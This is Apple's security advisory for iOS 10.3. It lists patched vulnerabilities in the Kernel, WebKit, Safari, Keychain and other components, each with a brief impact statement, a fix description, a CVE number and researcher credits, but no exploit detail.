Entry updated April 24, 2017

**Kernel**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An application may be able to execute arbitrary code with kernel privileges

Description: A memory corruption issue was addressed through improved input validation.

CVE-2017-2398: Lufeng Li of Qihoo 360 Vulcan Team

CVE-2017-2401: Lufeng Li of Qihoo 360 Vulcan Team

**Kernel**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An application may be able to execute arbitrary code with kernel privileges

Description: An integer overflow was addressed through improved input validation.

CVE-2017-2440: an anonymous researcher

**Kernel**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A malicious application may be able to execute arbitrary code with root privileges

Description: A race condition was addressed through improved memory handling.

CVE-2017-2456: lokihardt of Google Project Zero

**Kernel**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An application may be able to execute arbitrary code with kernel privileges

Description: A use after free issue was addressed through improved memory management.

CVE-2017-2472: Ian Beer of Google Project Zero

**Kernel**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A malicious application may be able to execute arbitrary code with kernel privileges

Description: A memory corruption issue was addressed through improved input validation.

CVE-2017-2473: Ian Beer of Google Project Zero

**Kernel**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An application may be able to execute arbitrary code with kernel privileges

Description: An off-by-one issue was addressed through improved bounds checking.

CVE-2017-2474: Ian Beer of Google Project Zero

**Kernel**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An application may be able to execute arbitrary code with kernel privileges

Description: A race condition was addressed through improved locking.

CVE-2017-2478: Ian Beer of Google Project Zero

**Kernel**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An application may be able to execute arbitrary code with kernel privileges

Description: A buffer overflow issue was addressed through improved memory handling.

CVE-2017-2482: Ian Beer of Google Project Zero

CVE-2017-2483: Ian Beer of Google Project Zero

**Kernel**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An application may be able to execute arbitrary code with elevated privileges

Description: A memory corruption issue was addressed through improved memory handling.

CVE-2017-2490: Ian Beer of Google Project Zero, The UK's National Cyber Security Centre (NCSC)

Entry added March 31, 2017

**Keyboards**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An application may be able to execute arbitrary code

Description: A buffer overflow was addressed through improved bounds checking.

CVE-2017-2458: Shashank (@cyberboyIndia)

**Keychain**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An attacker who is able to intercept TLS connections may be able to read secrets protected by iCloud Keychain.

Description: In certain circumstances, iCloud Keychain failed to validate the authenticity of OTR packets. This issue was addressed through improved validation.

CVE-2017-2448: Alex Radocea of Longterm Security, Inc.

Entry updated March 30, 2017

**libarchive**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A local attacker may be able to change file system permissions on arbitrary directories

Description: A validation issue existed in the handling of symlinks. This issue was addressed through improved validation of symlinks.

CVE-2017-2390: Omer Medan of enSilo Ltd

**libc++abi**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Demangling a malicious C++ application may lead to arbitrary code execution

Description: A use after free issue was addressed through improved memory management.

CVE-2017-2441

**libxslt**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Multiple vulnerabilities in libxslt

Description: Multiple memory corruption issues were addressed through improved memory handling.

CVE-2017-5029: Holger Fuhrmannek

Entry added March 28, 2017

**Pasteboard**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A person with physical access to an iOS device may read the pasteboard

Description: The pasteboard was encrypted with a key protected only by the hardware UID. This issue was addressed by encrypting the pasteboard with a key protected by the hardware UID and the user's passcode.

CVE-2017-2399

**Phone**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A third party app can initiate a phone call without user interaction

Description: An issue existed in iOS allowing for calls without prompting. This issue was addressed by prompting a user to confirm call initiation.

CVE-2017-2484

**Profiles**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An attacker may be able to exploit weaknesses in the DES cryptographic algorithm

Description: Support for the 3DES cryptographic algorithm was added to the SCEP client and DES was deprecated.

CVE-2017-2380: an anonymous researcher

**Quick Look**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Tapping a tel link in a PDF document could trigger a call without prompting the user

Description: An issue existed when checking the tel URL before initiating calls. This issue was addressed with the addition of a confirmation prompt.

CVE-2017-2404: Tuan Anh Ngo (Melbourne, Australia), Christoph Nehring

**Safari**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Visiting a malicious website may lead to address bar spoofing

Description: A state management issue was addressed by disabling text input until the destination page loads.

CVE-2017-2376: an anonymous researcher, Michal Zalewski of Google Inc, Muneaki Nishimura (nishimunea) of Recruit Technologies Co., Ltd., Chris Hlady of Google Inc, an anonymous researcher, Yuyang Zhou of Tencent Security Platform Department (security.tencent.com)

**Safari**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A local user may be able to discover websites a user has visited in Private Browsing

Description: An issue existed in SQLite deletion. This issue was addressed through improved SQLite cleanup.

CVE-2017-2384

**Safari**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may present authentication sheets over arbitrary web sites

Description: A spoofing and denial-of-service issue existed in the handling of HTTP authentication. This issue was addressed through making HTTP authentication sheets non-modal.

CVE-2017-2389: ShenYeYinJiu of Tencent Security Response Center, TSRC

**Safari**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Visiting a malicious website by clicking a link may lead to user interface spoofing

Description: A spoofing issue existed in the handling of FaceTime prompts. This issue was addressed through improved input validation.

CVE-2017-2453: xisigr of Tencent's Xuanwu Lab (tencent.com)

**Safari Reader**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Enabling the Safari Reader feature on a maliciously crafted webpage may lead to universal cross site scripting

Description: Multiple validation issues were addressed through improved input sanitization.

CVE-2017-2393: Erling Ellingsen

**SafariViewController**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Cache state is not properly kept in sync between Safari and SafariViewController when a user clears Safari cache

Description: An issue existed in clearing Safari cache information from SafariViewController. This issue was addressed by improving cache state handling.

CVE-2017-2400: Abhinav Bansal of Zscaler, Inc.

**Sandbox Profiles**

Available for: iPhone 5 and later, iPad 4th generation and later, and iPod touch 6th generation

Impact: A malicious application may be able to access the iCloud user record of a signed in user

Description: An access issue was addressed through additional sandbox restrictions on third party applications.

CVE-2017-6976: George Dan (@theninjaprawn)

Entry added August 1, 2017

**Security**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Validating empty signatures with SecKeyRawVerify() may unexpectedly succeed

Description: An validation issue existed with cryptographic API calls. This issue was addressed through improved parameter validation.

CVE-2017-2423: an anonymous researcher

**Security**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An application may be able to execute arbitrary code with root privileges

Description: A buffer overflow was addressed through improved bounds checking.

CVE-2017-2451: Alex Radocea of Longterm Security, Inc.

**Security**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing a maliciously crafted x509 certificate may lead to arbitrary code execution

Description: A memory corruption issue existed in the parsing of certificates. This issue was addressed through improved input validation.

CVE-2017-2485: Aleksandar Nikolic of Cisco Talos

**Siri**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Siri might reveal text message contents while the device is locked

Description: An insufficient locking issue was addressed with improved state management.

CVE-2017-2452: Hunter Byrnes

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Dragging and dropping a maliciously crafted link may lead to bookmark spoofing or arbitrary code execution

Description: A validation issue existed in bookmark creation. This issue was addressed through improved input validation.

CVE-2017-2378: xisigr of Tencent's Xuanwu Lab (tencent.com)

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Visiting a malicious website may lead to address bar spoofing

Description: An inconsistent user interface issue was addressed through improved state management.

CVE-2017-2486: redrain of light4freedom

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may exfiltrate data cross-origin

Description: A prototype access issue was addressed through improved exception handling.

CVE-2017-2386: André Bargull

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may lead to arbitrary code execution

Description: Multiple memory corruption issues were addressed through improved input validation.

CVE-2017-2394: Apple

CVE-2017-2396: Apple

CVE-2016-9642: Gustavo Grieco

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may lead to arbitrary code execution

Description: Multiple memory corruption issues were addressed through improved memory handling.

CVE-2017-2395: Apple

CVE-2017-2454: Ivan Fratric of Google Project Zero, Zheng Huang of the Baidu Security Lab working with Trend Micro's Zero Day Initiative

CVE-2017-2455: Ivan Fratric of Google Project Zero

CVE-2017-2457: lokihardt of Google Project Zero

CVE-2017-2459: Ivan Fratric of Google Project Zero

CVE-2017-2460: Ivan Fratric of Google Project Zero

CVE-2017-2464: Jeonghoon Shin, natashenka of Google Project Zero

CVE-2017-2465: Zheng Huang and Wei Yuan of Baidu Security Lab

CVE-2017-2466: Ivan Fratric of Google Project Zero

CVE-2017-2468: lokihardt of Google Project Zero

CVE-2017-2469: lokihardt of Google Project Zero

CVE-2017-2470: lokihardt of Google Project Zero

CVE-2017-2476: Ivan Fratric of Google Project Zero

CVE-2017-2481: 0011 working with Trend Micro's Zero Day Initiative

Entry updated June 20, 2017

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may lead to arbitrary code execution

Description: A type confusion issue was addressed through improved memory handling.

CVE-2017-2415: Kai Kang of Tencent's Xuanwu Lab (tentcent.com)

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may lead to unexpectedly unenforced Content Security Policy

Description: An access issue existed in Content Security Policy. This issue was addressed through improved access restrictions.

CVE-2017-2419: Nicolai Grødum of Cisco Systems

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may lead to high memory consumption

Description: An uncontrolled resource consumption issue was addressed through improved regex processing.

CVE-2016-9643: Gustavo Grieco

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may result in the disclosure of process memory

Description: An information disclosure issue existed in the processing of OpenGL shaders. This issue was addressed through improved memory management.

CVE-2017-2424: Paul Thomson (using the GLFuzz tool) of the Multicore Programming Group, Imperial College London

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may lead to arbitrary code execution

Description: A memory corruption issue was addressed through improved input validation.

CVE-2017-2433: Apple

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may exfiltrate data cross-origin

Description: Multiple validation issues existed in the handling of page loading. This issue was addressed through improved logic.

CVE-2017-2364: lokihardt of Google Project Zero

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A malicious website may exfiltrate data cross-origin

Description: A validation issue existed in the handling of page loading. This issue was addressed through improved logic.

CVE-2017-2367: lokihardt of Google Project Zero

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may lead to universal cross site scripting

Description: A logic issue existed in the handling of frame objects. This issue was addressed with improved state management.

CVE-2017-2445: lokihardt of Google Project Zero

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may lead to arbitrary code execution

Description: A logic issue existed in the handling of strict mode functions. This issue was addressed with improved state management.

CVE-2017-2446: natashenka of Google Project Zero

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Visiting a maliciously crafted website may compromise user information

Description: A memory corruption issue was addressed through improved memory handling.

CVE-2017-2447: natashenka of Google Project Zero

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may lead to arbitrary code execution

Description: Multiple memory corruption issues were addressed through improved memory handling.

CVE-2017-2463: Kai Kang (4B5F5F4B) of Tencent's Xuanwu Lab (tencent.com) working with Trend Micro's Zero Day Initiative

Entry added March 28, 2017

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may lead to arbitrary code execution

Description: A use after free issue was addressed through improved memory management.

CVE-2017-2471: Ivan Fratric of Google Project Zero

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may lead to universal cross site scripting

Description: A logic issue existed in frame handling. This issue was addressed through improved state management.

CVE-2017-2475: lokihardt of Google Project Zero

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may exfiltrate data cross-origin

Description: A validation issue existed in element handling. This issue was addressed through improved validation.

CVE-2017-2479: lokihardt of Google Project Zero

Entry added March 28, 2017

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may exfiltrate data cross-origin

Description: A validation issue existed in element handling. This issue was addressed through improved validation.

CVE-2017-2480: lokihardt of Google Project Zero

CVE-2017-2493: lokihardt of Google Project Zero

Entry updated April 24, 2017

**WebKit JavaScript Bindings**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may exfiltrate data cross-origin

Description: Multiple validation issues existed in the handling of page loading. This issue was addressed through improved logic.

CVE-2017-2442: lokihardt of Google Project Zero

**WebKit Web Inspector**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Closing a window while paused in the debugger may lead to unexpected application termination

Description: A memory corruption issue was addressed through improved input validation.

CVE-2017-2377: Vicki Pfau

**WebKit Web Inspector**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may lead to arbitrary code execution

Description: A memory corruption issue was addressed through improved input validation.

CVE-2017-2405: Apple

## Additional recognition

**XNU**

We would like to acknowledge Lufeng Li of Qihoo 360 Vulcan Team for their assistance.

**WebKit**

We would like to acknowledge Yosuke HASEGAWA of Secure Sky Technology Inc. for their assistance.

**Safari**

We would like to acknowledge Flyin9 (ZhenHui Lee) for their assistance.

**Settings**

We would like to acknowledge Adi Sharabani and Yair Amit of Skycure for their assistance.

Information about products not manufactured by Apple, or independent websites not controlled or tested by Apple, is provided without recommendation or endorsement. Apple assumes no responsibility with regard to the selection, performance, or use of third-party websites or products. Apple makes no representations regarding third-party website accuracy or reliability. [Contact the vendor](https://support.apple.com/103190) for additional information.

Published Date: November 03, 2023

Helpful?

Yes

No

Character limit:
250

Maximum character limit is 250.

Please don’t include any personal information in your comment.
Submit

Thanks for your feedback.

## Apple Footer

[
Apple](https://www.apple.com)

1. [Support](https://support.apple.com)
2. About the security content of iOS 10.3

[United States](https://support.apple.com/en-us/103075/localeselector "Choose your country or region")

Copyright © 2025 Apple Inc. All rights reserved.
 [Privacy Policy](https://www.apple.com/legal/privacy/en-ww/) [Terms of Use](https://www.apple.com/legal/internet-services/terms/site.html) [Sales and Refunds](https://www.apple.com/shop/goto/help/sales_refunds) [Site Map](https://www.apple.com/sitemap/)


